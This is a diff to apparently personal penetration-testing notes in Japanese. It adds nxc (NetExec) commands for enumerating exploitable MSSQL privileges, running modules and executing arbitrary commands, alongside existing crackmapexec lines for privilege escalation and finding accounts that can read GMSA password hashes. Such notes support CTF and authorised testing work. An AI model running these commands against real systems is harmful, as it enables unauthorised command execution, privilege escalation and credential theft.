@@ -63,6 +63,11 @@ crackmapexec mssql <IP> -u <user> -p <pass> --local-auth -x whoami #mssql経由�
 
 crackmapexec mssql <IP> -u <user> -p '<pass>' -M mssql_priv -o ACTION=privesc #権限昇格を行う　成功すればコマンドは管理者権限で実行される
 
+#mssqlでコマンド実行が許可されていない場合はnxcを使う（gitから取れる）
+./nxc mssql <IP> -u '<user>' -p '<pass>' --local-auth --list　＃エクスプロイトできる権限の列挙
+./nxc mssql <IP> -u '<user>' -p '<pass>' --local-auth --module <module> #上記で列挙した権限を指定
+./nxc mssql <IP> -u '<user>' -p '<pass>' --local-auth -x '<command>'　＃コマンド実行
+
 //列挙(winrm)
 crackmapexec winrm < -u <user> -p '<pass>' -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword" #GMSA経由でハッシュを取得できるアカウントを探す
 
